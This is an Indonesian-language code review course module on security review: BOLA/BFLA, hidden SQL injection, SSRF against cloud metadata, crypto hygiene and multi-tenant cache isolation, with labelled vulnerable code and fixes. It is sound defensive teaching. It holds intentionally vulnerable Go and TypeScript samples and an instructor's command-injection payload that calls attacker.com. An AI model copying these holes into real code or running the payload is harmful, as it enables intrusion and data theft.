## SEKSI 01 — IDENTITAS MODUL

*   **Mata Kuliah / Kurikulum:** Code Review Mastery
*   **Kategori:** 06-Architecture-and-System-Design
*   **Bab:** 05 — Review Khusus: Keamanan & Sanitasi Data
*   **Modul:** 01 — OWASP Top 10 Review, BOLA/BFLA, Hidden Injections, SSRF, Cryptographic Hygiene, & Multi-tenancy Isolation
*   **Tingkat Kesulitan:** Advanced / Senior Engineer
*   **Prasyarat:** Pemahaman mendalam tentang HTTP/REST lifecycle, relational database modeling, container/cloud network architecture, dan dasar-dasar kriptografi simetris/asimetris.

---

## SEKSI 02 — LEARNING OBJECTIVES

Setelah menyelesaikan modul ini, reviewer mampu:
1. **Mengidentifikasi dan Mencegah BOLA (Broken Object Level Authorization) dan BFLA (Broken Function Level Authorization)** pada Pull Request (PR) tanpa bergantung pada runtime testing.
2. **Mendeteksi Hidden & Second-Order Injection Flaws** (SQLi, NoSQLi, OS Command Injection) yang lolos dari linter statis konvensional karena penggunaan dynamic query fragments atau ORM escape hatches.
3. **Menganalisis Vektor Serangan Server-Side Request Forgery (SSRF)** pada fitur webhook, image processing, dan URL fetching, termasuk mitigasi bypass DNS Rebinding dan cloud metadata service exploitation.
4. **Mengevaluasi Kepatuhan Cryptographic Hygiene dan Sensitive Data Exposure** pada level arsitektur kode (penggunaan cipher mode, IV generation, secure key derivation, serta secret leakage di log/stack trace).
5. **Memvalidasi Boundary Multi-tenancy Isolation** untuk mencegah kebocoran data antar-tenant baik pada shared-database shared-schema (Logical Isolation via RLS / Context Propagation) maupun distributed cache systems.

---

## SEKSI 03 — KONSEP UTAMA (CONCEPT MAP)

```
                            KEAMANAN & SANITASI DATA (CODE REVIEW)
                                            │
         ┌──────────────────────────────────┼──────────────────────────────────┐
         │                                  │                                  │
         ▼                                  ▼                                  ▼
   AUTHORIZATION BOUNDS              INJECTION & SSRF               DATA PRIVACY & ISOLATION
         │                                  │                                  │
  ┌──────┴──────┐                    ┌──────┴──────┐                    ┌──────┴──────┐
  │             │                    │             │                    │             │
BOLA          BFLA             Hidden Injection   SSRF           Crypto Hygiene   Multi-Tenancy
(IDOR at     (Missing          (Dynamic ORM,      (Metadata,     (Weak Ciphers,   (RLS bypass,
 Context)     RBAC/Role)       Second-Order)      Rebinding)      Key Derivation) Tenant Leak)
```

---

## SEKSI 04 — MENGAPA INI PENTING (WHY)

Seringkali tim engineering menganggap SAST (Static Application Security Testing) dan DAST (Dynamic Application Security Testing) dalam pipeline CI/CD sudah cukup untuk menangkal celah keamanan. Anggapan ini keliru:

1. **SAST Buta Konteks Bisnis:** SAST tool dapat mendeteksi fungsi `eval()` atau `exec()`, namun **tidak dapat mendeteksi BOLA**. SAST tidak mengetahui apakah entitas `Invoice #9901` milik pengguna yang sedang login atau milik kompetitornya. Validasi otorisasi objek memerlukan inspeksi kontekstual manusia saat code review.
2. **Biaya Remediasi Eksponensial:** Kerentanan keamanan yang lolos ke tahap production dan dieksploitasi mengakibatkan *breach notification cost*, denda regulasi (GDPR, PDP), reputational damage, dan arsitektur refactoring darurat di bawah tekanan insiden.
3. **Multi-Tenancy Breach adalah Vonis Mati Perusahaan SaaS:** Kebocoran data antar-tenant (cross-tenant data leakage) melalui cache poisoning atau missed `WHERE tenant_id = ?` merusak trust enterprise customer seketika.

Sebagai reviewer, Anda adalah garis pertahanan arsitektural terakhir sebelum kode dieksekusi di runtime.

---

## SEKSI 05 — APA ITU (WHAT)

### 1. BOLA & BFLA
*   **BOLA (Broken Object Level Authorization / IDOR):** Terjadi ketika kode menerima identifier objek dari input eksternal (misal: URI parameter, body JSON) dan langsung melakukan operasi read/write ke database tanpa memverifikasi relasi kepemilikan antara *current authenticated subject* dan *requested object*.
*   **BFLA (Broken Function Level Authorization):** Terjadi ketika endpoint administratif atau fungsionalitas sensitif hanya menyembunyikan visibilitas UI tanpa memvalidasi role/permission pengguna di layer controller/domain logic.

### 2. Hidden & Second-Order Injection
*   **Hidden Injection:** Query injection yang terjadi bukan lewat form input langsung, melainkan melalui helper ORM, dynamic sorting parameter (`ORDER BY` clauses yang tidak dapat di-parameterize), JSON-path extraction, atau Raw SQL fragments.
*   **Second-Order Injection:** Input berbahaya disimpan di database secara aman via parameterized query, namun dieksekusi sebagai query dinamis di background job, reporting engine, atau database trigger di waktu berikutnya.

### 3. SSRF (Server-Side Request Forgery)
Celah yang memungkinkan backend server dipaksa mengirimkan HTTP/TCP request ke target internal (misalnya AWS/GCP Metadata endpoint `169.254.169.254`, localhost Redis `127.0.0.1:6379`, intranet kubernetes service) melalui input URL yang diberikan user.

### 4. Cryptographic Hygiene & Sensitive Data Exposure
Kesalahan implementasi kriptografi: penggunaan algoritma usang (MD5, SHA1 untuk hashing; DES, RC4 untuk enkripsi), static/hardcoded Initialization Vector (IV) pada AES-CBC, penggunaan AES-ECB mode, derive password tanpa memory-hard key derivation function (seperti Argon2id atau scrypt), serta PII (Personally Identifiable Information) yang dicatat ke *unmasked stdout/loggers*.

### 5. Multi-Tenancy Isolation Failure
Kegagalan menjamin partisi data antar pelanggan dalam shared-infrastructure. Terjadi akibat hilangnya *tenant context propagation* pada async worker, query tanpa filter tenant, atau cache collision pada Redis key yang tidak diprefix secara deterministik dengan `tenant_id`.

---

## SEKSI 06 — BAGAIMANA BEKERJA (HOW)

### Mental Model Reviewer: Source-to-Sink Taint Tracking

Ketika mereview PR yang menyentuh data ingestion, reviewer harus menelusuri alur input menggunakan pendekatan **Taint Analysis**:

1. **Source:** Di mana input masuk? (`req.params`, `req.body`, `req.headers`, Webhook payload, Message Broker consumer).
2. **Sanitizer / Validator:** Apakah ada schema validation (Zod, Joi, Validator struct)? Apakah tipe data dipaksa ke domain primitives?
3. **Propagator:** Bagaimana data dialirkan? Apakah masuk ke DTO, passing antar service, atau masuk context threading?
4. **Sink (Titik Eksekusi Berbahaya):**
    *   Database sink: ORM dynamic queries, Raw SQL, NoSQL filter.
    *   Network sink: `fetch()`, `axios.get()`, `http.Client`.
    *   OS sink: `exec()`, `spawn()`, direct file system access.
    *   Logging sink: `logger.info()`, metrics payload.

```
[ UNTRUSTED SOURCE ]
   │  (req.params.tenantId, req.body.url, etc.)
   ▼
[ VALIDATOR / ENFORCER ] ──(Gagal)──► [ 400 Bad Request / 403 Forbidden ]
   │  (Strict Type, Schema Check, Ownership & Tenant Context Verification)
   ▼
[ SECURE SINK ]
   ├── Database: Parameterized SQL + Multi-Tenant RLS Scope
   ├── Network: SSRF-Safe HTTP Client (IP Blacklist, Safe Redirects)
   └── Log: Redacted / Masked Context Output
```

---

## SEKSI 07 — DIAGRAM ASCII DETAIL

Berikut adalah arsitektur request flow yang aman vs rentan terhadap SSRF dan Broken Multi-tenancy Isolation:

```
[ UNTRUSTED CLIENT ]
        │
        │ HTTP POST /api/v1/import-document { "tenant_id": "T-100", "source_url": "http://169.254.169.254/latest/meta-data/" }
        ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ API GATEWAY / REVERSE PROXY                                                 │
│ Extracts JWT: AuthSubject = User_A (Belongs strictly to Tenant "T-200")    │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
                                       ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ CONTROLLER / DOMAIN SERVICE LAYER                                           │
│                                                                             │
│ [CHECK 1: BOLA & Multi-Tenancy Conflict]                                    │
│   ❌ VULNERABLE: req.tenant_id digunakan langsung dari Body ("T-100").      │
│   ✅ SECURE: Abaikan body! Gunakan context.tenant_id dari verified JWT      │
│             ("T-200"). Tolak request jika terjadi impersonasi illegal.      │
│                                                                             │
│ [CHECK 2: SSRF Resolution & Firewall]                                       │
│   ❌ VULNERABLE: httpClient.Get(req.source_url)                             │
│   ✅ SECURE:                                                                │
│      1. Parse URL Scheme (Hanya izinkan HTTP/HTTPS).                        │
│      2. Resolve DNS hostname -> IP addresses.                              │
│      3. Validasi IP: Tolak Private/Loopback/Link-Local Range                │
│         (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, etc.) │
│      4. Bind socket langsung ke resolved public IP (cegah DNS Rebinding).   │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
                      ┌────────────────┴────────────────┐
                      │                                 │
                      ▼                                 ▼
      ┌───────────────────────────────┐ ┌───────────────────────────────────┐
      │ INTERNAL METADATA / SERVICES  │ │ DATABASE LAYER (PostgreSQL)       │
      │ 169.254.169.254 (BLOCKED!)    │ │ ❌ WHERE id = :id                 │
      │ Local Redis (BLOCKED!)        │ │ ✅ SET LOCAL app.tenant_id = 'T-200'│
      │                               │ │    Row-Level Security (RLS) Active │
      │ Akses Ilegal Dicegah          │ │    Cross-Tenant Isolation Guaranteed│
      └───────────────────────────────┘ └───────────────────────────────────┘
```

---

## SEKSI 08 — CONTOH SEDERHANA (SIMPLE EXAMPLE)

### Masalah: Broken Object Level Authorization (BOLA) di REST Controller

#### ❌ KODE VULNERABLE (PR Submission)
```typescript
// GET /api/v1/documents/:documentId
export async function getDocumentHandler(req: Request, res: Response) {
  const { documentId } = req.params;
  
  // VULNERABILITY: User terautentikasi dapat membaca dokumen milik SIAPAPUN 
  // hanya dengan mengubah documentId di URL.
  const document = await db.document.findUnique({
    where: { id: documentId }
  });

  if (!document) {
    return res.status(404).json({ error: "Document not found" });
  }

  return res.status(200).json(document);
}
```

#### ✅ KODE DISETUJUI (Remediasi Reviewer)
```typescript
// GET /api/v1/documents/:documentId
export async function getDocumentHandler(req: Request, res: Response) {
  const { documentId } = req.params;
  const user = req.user; // Diinjeksi oleh authentication middleware yang terverifikasi

  // MITIGASI BOLA: Validasi relasi kepemilikan di query level atau domain level
  const document = await db.document.findFirst({
    where: {
      id: documentId,
      tenantId: user.tenantId, // Multi-tenant boundary
      userId: user.id          // Object ownership boundary (jika data bersifat personal)
    }
  });

  if (!document) {
    // Return 404 instead of 403 to prevent Object ID Enumeration attacks
    return res.status(404).json({ error: "Document not found" });
  }

  return res.status(200).json(document);
}
```

---

## SEKSI 09 — CONTOH PRAKTIS (PRACTICAL EXAMPLE)

Skenario: PR menambahkan endpoint untuk webhook integration dan dynamic data filter dengan ORM. PR ini memiliki 3 kerentanan kritis: Hidden Dynamic SQL Injection, Blind SSRF, dan Redis Multi-Tenant Cache Leakage.

### ❌ KODE VULNERABLE (PR Code)

```typescript
import express from 'express';
import { PrismaClient } from '@prisma/client';
import axios from 'axios';
import Redis from 'ioredis';

const router = express.Router();
const prisma = new PrismaClient();
const cache = new Redis();

// 1. SSRF VULNERABILITY: Mengambil avatar dari webhook eksternal
router.post('/user/avatar-sync', async (req, res) => {
  const { webhookUrl } = req.body;
  
  // Vulnerable to SSRF: user bisa menginput 'http://169.254.169.254/latest/meta-data/'
  // atau 'http://localhost:6379'
  const response = await axios.get(webhookUrl);
  return res.json({ status: 'synced', dataSize: response.data.length });
});

// 2. HIDDEN SQL INJECTION: Dynamic ORDER BY pada Prisma $queryRaw
router.get('/reports', async (req, res) => {
  const { sortBy, order, tenantId } = req.query; // Mempercayai tenantId dari client!

  // Vulnerability: ORDER BY tidak bisa di-parameterize dengan safe query syntax standar.
  // String interpolation di sini memungkinkan SQL Injection.
  const query = `
    SELECT * FROM reports 
    WHERE tenant_id = '${tenantId}' 
    ORDER BY ${sortBy} ${order === 'desc' ? 'DESC' : 'ASC'}
  `;
  
  const data = await prisma.$queryRawUnsafe(query);
  return res.json(data);
});

// 3. CACHE MULTI-TENANT LEAKAGE: Global shared cache key
router.get('/config/:key', async (req, res) => {
  const { key } = req.params;
  const tenantId = req.user.tenantId;

  // Vulnerability: Cache key tidak mengisolasi tenant! 
  // Tenant A bisa membaca setting konfigurasi milik Tenant B.
  const cachedConfig = await cache.get(`config:${key}`);
  if (cachedConfig) {
    return res.json(JSON.parse(cachedConfig));
  }

  const config = await prisma.configuration.findFirst({
    where: { key, tenantId }
  });

  await cache.set(`config:${key}`, JSON.stringify(config), 'EX', 3600);
  return res.json(config);
});

export default router;
```

---

### ✅ KODE DISETUJUI (Reviewer Remediated Version)

```typescript
import express from 'express';
import { PrismaClient, Prisma } from '@prisma/client';
import http from 'http';
import https from 'https';
import dns from 'dns/promises';
import ipaddr from 'ipaddr.js';
import Redis from 'ioredis';
import { z } from 'zod';

const router = express.Router();
const prisma = new PrismaClient();
const cache = new Redis();

// -------------------------------------------------------------
// HELPER: Anti-SSRF Safe HTTP Client
// -------------------------------------------------------------
async function fetchSafeUrl(rawUrl: string): Promise<Buffer> {
  const parsedUrl = new URL(rawUrl);

  // Batasi protocol hanya HTTP dan HTTPS
  if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
    throw new Error('Disallowed protocol');
  }

  // Selesaikan DNS untuk mitigasi private address space
  const addresses = await dns.resolve4(parsedUrl.hostname);
  if (addresses.length === 0) {
    throw new Error('Host resolution failed');
  }

  const targetIp = addresses[0];
  const parsedIp = ipaddr.parse(targetIp);

  // Blokir Loopback, Private, Carrier-Grade NAT, Link-Local, dsb.
  const range = parsedIp.range();
  const prohibitedRanges = ['loopback', 'private', 'linkLocal', 'carrierGradeNat', 'broadcast'];
  if (prohibitedRanges.includes(range)) {
    throw new Error(`SSRF attempt detected. Target IP falls in ${range} range.`);
  }

  // Gunakan Custom Agent atau Fetch yang di-pin ke resolved safe IP
  // (mencegah DNS Rebinding di interval TOCTOU)
  return new Promise((resolve, reject) => {
    const client = parsedUrl.protocol === 'https:' ? https : http;
    const req = client.request(
      {
        host: targetIp,
        headers: { Host: parsedUrl.hostname },
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'GET',
        timeout: 5000,
      },
      (res) => {
        if (res.statusCode !== 200) {
          return reject(new Error(`Failed fetching: ${res.statusCode}`));
        }
        const chunks: Buffer[] = [];
        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => resolve(Buffer.concat(chunks)));
      }
    );
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Request timed out'));
    });
    req.end();
  });
}

// -------------------------------------------------------------
// 1. SECURE SSRF HANDLER
// -------------------------------------------------------------
router.post('/user/avatar-sync', async (req, res) => {
  const schema = z.object({ webhookUrl: z.string().url() });
  const parseResult = schema.safeParse(req.body);

  if (!parseResult.success) {
    return res.status(400).json({ error: 'Invalid URL payload' });
  }

  try {
    const dataBuffer = await fetchSafeUrl(parseResult.data.webhookUrl);
    return res.json({ status: 'synced', dataSize: dataBuffer.length });
  } catch (err: any) {
    return res.status(400).json({ error: 'URL fetch rejected: ' + err.message });
  }
});

// -------------------------------------------------------------
// 2. SECURE RAW SQL INJECTION MITIGATION
// -------------------------------------------------------------
const ALLOWED_SORT_COLUMNS = ['created_at', 'total_amount', 'status'] as const;
type SortColumn = typeof ALLOWED_SORT_COLUMNS[number];

router.get('/reports', async (req, res) => {
  // Ambil tenantId secara deterministik dari authenticated context, BUKAN req.query
  const tenantId = req.user.tenantId;

  // Whitelist-based validation untuk non-bindable SQL constructs (ORDER BY)
  const sortBy = req.query.sortBy as string;
  const isSortAllowed = ALLOWED_SORT_COLUMNS.includes(sortBy as SortColumn);
  const targetSort = isSortAllowed ? (sortBy as SortColumn) : 'created_at';
  const targetOrder = req.query.order === 'desc' ? Prisma.sql`DESC` : Prisma.sql`ASC`;

  // Prisma.sql tag melakukan sanitasi dan bound parameters otomatis untuk nilai literals
  const data = await prisma.$queryRaw(
    Prisma.sql`
      SELECT id, title, total_amount, created_at 
      FROM reports 
      WHERE tenant_id = ${tenantId} 
      ORDER BY ${Prisma.raw(targetSort)} ${targetOrder}
    `
  );

  return res.json(data);
});

// -------------------------------------------------------------
// 3. SECURE MULTI-TENANT CACHING
// -------------------------------------------------------------
router.get('/config/:key', async (req, res) => {
  const { key } = req.params;
  const tenantId = req.user.tenantId;

  // Partitioned Cache Key Pattern: Mandatory tenant isolation namespace
  const isolatedCacheKey = `tenants:${tenantId}:configs:${key}`;

  const cachedConfig = await cache.get(isolatedCacheKey);
  if (cachedConfig) {
    return res.json(JSON.parse(cachedConfig));
  }

  const config = await prisma.configuration.findFirst({
    where: { key, tenantId },
    select: { key: true, value: true } // Hindari Sensitive Data Exposure (jangan SELECT *)
  });

  if (!config) {
    return res.status(404).json({ error: 'Configuration not found' });
  }

  await cache.set(isolatedCacheKey, JSON.stringify(config), 'EX', 3600);
  return res.json(config);
});

export default router;
```

---

## SEKSI 10 — TRADE-OFFS & PERTIMBANGAN

| Strategi / Pilihan Arsitektural | Keuntungan (Pros) | Biaya / Trade-Off (Cons) | Rekomendasi Reviewer |
| :--- | :--- | :--- | :--- |
| **Whitelisting Sort Columns** | 100% imun terhadap SQLi di klausa non-bindable (`ORDER BY`, table names). | Membutuhkan maintenance array whitelist saat skema tabel bertambah. | Wajib untuk dynamic queries; tolak pendekatan sanitasi regex. |
| **Full Outbound Proxy for SSRF** | Seluruh validasi outbound network di-offload ke level infra (misal: Squid, Envoy). | Menambah network hop, latensi operasional, dan kompleksitas CI local run. | Gunakan library level jika tim belum memiliki egress gateway dedicated. |
| **PostgreSQL Row-Level Security (RLS)** | Boundary multi-tenancy ditegakkan di engine database; query developer tanpa WHERE clause tetap aman. | Overhead CPU DB (5-15%), profiling tracing lebih kompleks, connection pooling harus disetup khusus. | Terapkan untuk aplikasi multi-tenant enterprise dengan level kepatuhan ketat. |
| **Field-Level Encryption (AES-GCM)** | Data PII tetap terenkripsi meskipun database di-dump penyerang. | Database tidak bisa melakukan indexing/searching efisien pada kolom terenkripsi. | Terapkan hanya pada data bernilai tinggi (NIK, token finansial, kartu kredit). |

---

## SEKSI 11 — BEST PRACTICES

### Reviewer Checklist Matrix

```
[ ] 1. AUTHORIZATION & TENANT CONTEXT
    ├── Apakah `tenant_id` atau `user_id` diekstrak HANYA dari verified session/token?
    ├── Apakah setiap write/read query menyertakan ownership constraints?
    └── Apakah endpoint bulk/batch action memvalidasi bahwa SEMUA ID milik requester?

[ ] 2. INJECTION FLUIDITY
    ├── Apakah ada penggunaan raw SQL ($queryRawUnsafe, db.query(string concat))?
    ├── Apakah klausa ORDER BY, GROUP BY, dan column projections di-whitelist ketat?
    └── Apakah ada shell execution (exec, spawn) yang menerima parameter runtime?

[ ] 3. SSRF RESISTANCE
    ├── Apakah URL eksternal yang di-fetch divalidasi skema dan IP targetnya?
    ├── Apakah resolving IP diverifikasi bukan private IP (RFC 1918) atau cloud metadata?
    └── Apakah socket di-pin ke resolved IP untuk mencegah DNS Rebinding (TOCTOU)?

[ ] 4. CRYPTOGRAPHIC INTEGRITY
    ├── Tidak ada penggunaan MD5, SHA1, DES, 3DES, atau AES-ECB.
    ├── Symmetric cipher menggunakan authenticated encryption (AES-256-GCM / ChaCha20-Poly1305).
    ├── Initialization Vector (IV) / Nonce di-generate secara kriptografis acak (crypto.randomBytes)
    │   dan TIDAK PERNAH digunakan ulang dengan key yang sama.
    └── Password hashing menggunakan Argon2id atau scrypt dengan memory and time cost yang memadai.

[ ] 5. SENSITIVE DATA EXPOSURE
    ├── Apakah log statement mengecualikan token, kata sandi, NIK, dan credential?
    └── Apakah respons API membatasi fields (menggunakan select/DTO explicit) bukan SELECT *?
```

---

## SEKSI 12 — KESALAHAN UMUM (COMMON MISTAKES)

1. **Regex Sanitization untuk SQL Injection:** Reviewer menyetujui kode yang membersihkan query dengan regex seperti `input.replace(/union|select|drop/gi, '')`. Penyerang dapat membypass dengan nesting (`SELUNIONECT`) atau character encoding tricks. Tolak regex sanitization, paksa parameterized query!
2. **DNS Check Tanpa Socket Pinning (DNS Rebinding):** Developer mengecek apakah domain resolved ke public IP, lalu memanggil `axios.get(url)`. Di antara waktu pengecekan dan eksekusi HTTP request, attacker mengubah DNS record menjadi `127.0.0.1` (Time-of-Check to Time-of-Use / TOCTOU).
3. **Mengabaikan Second-Order Path Traversal:** Mengira input file path sudah aman karena lolos validasi awal, namun ketika file disimpan dan di-extract via zip/tar archive utility lain, nama file `../../etc/passwd` mengeksekusi path traversal di worker.
4. **Hardcoded Tenant Context di Background Job:** Worker mengambil job dari Redis/Kafka tanpa menyertakan `tenant_id` context tracing, sehingga worker menjalankan mutasi data menggunakan service-level permissions tanpa batas tenant.
5. **Static Salt pada Password/Key Hashing:** Menggunakan salt global konstan di config file untuk semua hashing password, membatalkan perlindungan terhadap precomputed rainbow table attacks.

---

## SEKSI 13 — LATIHAN HANDS-ON (EXERCISES)

### Skenario Review: Audit PR File Transcoder Service

Diberikan Pull Request berikut dari engineer junior. Temukan dan tuliskan Security Review Comment untuk minimal **4 kerentanan kritis**.

```go
package main

import (
    "database/sql"
    "fmt"
    "net/http"
    "os/exec"
    "github.com/gin-gonic/gin"
)

type TranscodeRequest struct {
    TenantID string `json:"tenant_id"`
    VideoID  string `json:"video_id"`
    VideoURL string `json:"video_url"`
    Preset   string `json:"preset"`
}

func HandleTranscode(db *sql.DB) gin.HandlerFunc {
    return func(c *gin.Context) {
        var req TranscodeRequest
        if err := c.ShouldBindJSON(&req); err != nil {
            c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
            return
        }

        // Action 1: Query database status
        query := fmt.Sprintf("SELECT status FROM videos WHERE tenant_id = '%s' AND id = '%s'", req.TenantID, req.VideoID)
        row := db.QueryRow(query)
        var status string
        if err := row.Scan(&status); err != nil {
            c.JSON(http.StatusNotFound, gin.H{"error": "Video not found"})
            return
        }

        // Action 2: Trigger ffmpeg transcoding CLI tool
        cmdStr := fmt.Sprintf("ffmpeg -i %s -vcodec %s /tmp/%s.mp4", req.VideoURL, req.Preset, req.VideoID)
        out, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
        if err != nil {
            c.JSON(http.StatusInternalServerError, gin.H{"details": string(out)})
            return
        }

        c.JSON(http.StatusOK, gin.H{"status": "processed"})
    }
}
```

### Format Jawaban yang Diharapkan Reviewer:
1. Lokasi baris / logika yang rentan.
2. Klasifikasi Kerentanan (CWE / OWASP).
3. Skenario Eksploitasi Singkat.
4. Kode Rekomendasi Perbaikan.

---

## SEKSI 14 — QUIZ & SELF-ASSESSMENT

1. **Pertanyaan:** Pada framework ORM modern (seperti Sequelize, Hibernate, atau Prisma), bagian manakah yang paling rentan terhadap SQL Injection tersembunyi?
   * A) Pemanggilan `findById()` standar.
   * B) Klausul `where: { id: req.params.id }` dengan input UUID.
   * C) Klausul dynamic sorting/ordering atau raw expression functions (misal: `sequelize.literal()`).
   * D) Pagination limit dan offset integers.
   * *Jawaban yang Benar:* **C**. Kebanyakan ORM memparameterisasi values pada `where`, namun string literals pada column sorting, table aliases, atau escape hatches (`sequelize.literal`, `prisma.$queryRawUnsafe`) dieksekusi mentah ke database.

2. **Pertanyaan:** Apa perbedaan fundamental antara BOLA dan BFLA?
   * *Jawaban Singkat:* **BOLA** memanipulasi *identitas objek target* (contoh: user biasa mengakses dokumen milik user lain dengan mengganti `document_id`), sedangkan **BFLA** memanipulasi *akses fungsionalitas/tindakan* (contoh: user biasa memanggil endpoint internal admin `/api/admin/delete-database`).

3. **Pertanyaan:** Mengapa penggunaan AES-ECB (Electronic Codebook) sangat dilarang dalam Cryptographic Hygiene?
   * *Jawaban Singkat:* AES-ECB membagi plaintext ke dalam blok-blok dan mengenkripsi setiap blok dengan kunci yang sama tanpa vector inisialisasi (IV). Pola plaintext yang identik menghasilkan ciphertext yang identik, membocorkan struktur data yang mendasarinya (seperti fenomena ECB Penguin).

4. **Pertanyaan:** Apa risiko penggunaan `169.254.169.254` jika aplikasi yang Anda review memiliki celah SSRF di cloud provider (AWS/GCP/Azure)?
   * *Jawaban Singkat:* Penyerang dapat mencuri IAM instance role temporary credentials, metadata sistem, token bootstrap cluster, atau data identitas mesin yang dapat berujung pada pengambilalihan infrastruktur cloud secara penuh.

---

## SEKSI 15 — REFERENSI & SUMBER BELAJAR LANJUTAN

*   **OWASP Top 10:2021:** [owasp.org/Top10/](https://owasp.org/Top10/)
*   **OWASP API Security Top 10 (2023):** Khusus fokus BOLA (API1:2023) dan BFLA (API5:2023).
*   **CWE-918:** Server-Side Request Forgery (SSRF) Mitigations.
*   **NIST SP 800-38D:** Recommendation for Block Cipher Modes of Operation: Galois/Counter Mode (GCM).
*   **RFC 6749:** The OAuth 2.0 Authorization Framework (Scope & Tenant Assertions).
*   **PostgreSQL Official Documentation:** Chapter on Row Security Policies (RLS).

---

## SEKSI 16 — RINGKASAN MODUL (SUMMARY)

*   **BOLA dan BFLA** adalah kegagalan otorisasi logika bisnis yang tidak dapat dideteksi secara andal oleh scanner otomatis. Reviewer harus memastikan setiap manipulasi data terikat dengan verified tenant context dan explicit ownership boundaries.
*   **SQL Injection tidak pernah punah; ia berevolusi.** Celah ini bersembunyi di dalam ORM raw fragments, sorting dynamically constructed clauses, dan second-order deferred executions.
*   **SSRF pertahanan ganda:** Selalu kombinasikan skema whitelisting, dynamic DNS resolution validation terhadap private CIDR blocks, dan socket-level IP binding untuk menangkal serangan DNS Rebinding.
*   **Kriptografi tanpa kompromi:** Gunakan AEAD ciphers (AES-256-GCM / ChaCha20-Poly1305), random cryptographic IVs, serta hindari kebocoran data di logger sink.
*   **Multi-tenancy isolation** harus dipertahankan secara uniform, tidak hanya pada SQL query, namun juga merata pada distributed key-value cache namespaces dan async queue job boundaries.

---

## SEKSI 17 — GLOSARIUM

*   **BOLA (Broken Object Level Authorization):** Kegagalan sistemik saat endpoint menerima identifier data dari user tanpa memvalidasi apakah user tersebut berhak mengakses objek spesifik tersebut.
*   **BFLA (Broken Function Level Authorization):** Ketidakmampuan membatasi akses ke fungsionalitas istimewa (administrative actions) berdasarkan role pengguna sebenarnya.
*   **SSRF (Server-Side Request Forgery):** Eksploitasi yang mengelabui server untuk melakukan panggilan HTTP/TCP keluar atas nama penyerang.
*   **DNS Rebinding:** Teknik eksploitasi di mana domain attacker mengembalikan IP publik pada DNS lookup pertama, kemudian mengembalikan loopback/private IP (127.0.0.1) pada lookup berikutnya sesaat setelah validasi selesai.
*   **Row-Level Security (RLS):** Fitur database engine yang membatasi baris data mana yang dapat diakses oleh query pengguna berdasarkan sesi context database yang sedang aktif.
*   **AEAD (Authenticated Encryption with Associated Data):** Bentuk enkripsi yang menjamin kerahasiaan sekaligus integritas dan keaslian data (contoh: AES-GCM).

---

## SEKSI 18 — CATATAN INSTRUKTUR

*   **Fokus Tekanan:** Dorong peserta untuk tidak hanya mencari *syntax errors*, melainkan menganalisis *data provenance*. Tanyakan selalu: *"Dari mana variabel ini berasal? Apakah nilainya bisa dimanipulasi penyerang sebelum mencapai fungsi database/HTTP client ini?"*
*   **Latihan Interaktif:** Ketika membahas latihan Hands-On di Seksi 13, tunjukkan demonstrasi eksekusi command injection pada `exec.Command("sh", "-c", cmdStr)` dengan input payload `; curl attacker.com/$(whoami)`. Ingatkan bahwa command injection sering kali lolos karena developer mengira utility ffmpeg hanya membaca video file.

---

## SEKSI 19 — CHANGELOG & VERSI

*   **Versi 1.0.0 (Maret 2025):**
    *   Inisialisasi rilis kurikulum materi khusus Review Keamanan & Sanitasi Data.
    *   Integrasi OWASP Top 10 Web & API Security framework versi mutakhir.
    *   Penambahan arsitektur anti-SSRF dengan mitigasi DNS Rebinding socket pinning.
    *   Penyusunan checklist multi-tenancy Redis & RLS context propagation.

---

## SEKSI 20 — NAVIGASI KURIKULUM

*   **Modul Sebelumnya:** `06-Architecture-and-System-Design / Bab 04 — Performance & Scalability Code Reviews`
*   **Modul Saat Ini:** `06-Architecture-and-System-Design / Bab 05 — Review Khusus: Keamanan & Sanitasi Data (Modul 01)`
*   **Modul Berikutnya:** `06-Architecture-and-System-Design / Bab 06 — Concurrency, Race Conditions, & Distributed Locks Review`